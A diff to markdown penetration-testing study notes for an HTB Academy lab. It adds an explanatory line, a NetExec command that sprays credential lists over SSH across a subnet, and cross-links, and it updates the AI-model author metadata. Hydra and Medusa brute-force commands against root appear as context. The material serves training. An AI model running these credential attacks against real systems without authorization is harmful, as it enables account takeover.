@@ -88,6 +88,8 @@ ssh-audit 10.129.14.128 | grep -i "banner\|openssh"
 
 ## Brute Force / Auth (not ssh-audit — use these instead)
 
+ssh-audit only fingerprints the server config; for credential attacks use:
+
 ```bash
 # Hydra SSH brute force
 hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
@@ -96,12 +98,16 @@ hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
 # Medusa
 medusa -h 10.129.14.128 -u root -P rockyou.txt -M ssh
 
-# Kerbrute (for AD accounts via SSH)
-# Use crackmapexec / netexec for SMB-based user validation
+# NetExec — spray creds / validate over SSH across hosts
+nxc ssh 10.129.14.0/24 -u users.txt -p passwords.txt --continue-on-success
 ```
 
 ---
 
+> [!note] **See also** — Service enumeration + attack surface: [[Services/Remote Access/SSH|SSH]]. Credential attacks once you've fingerprinted the server: [[Tools/Auth/Hydra|Hydra]], [[Tools/Auth/Medusa|Medusa]], [[Class notes/HTB Academy/CPTS v2 (claude)/Password Attacks|Password Attacks]].
+
+---
+
 *Created: 2026-03-13*
-*Updated: 2026-03-13*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-31*
+*Model: claude-opus-5*
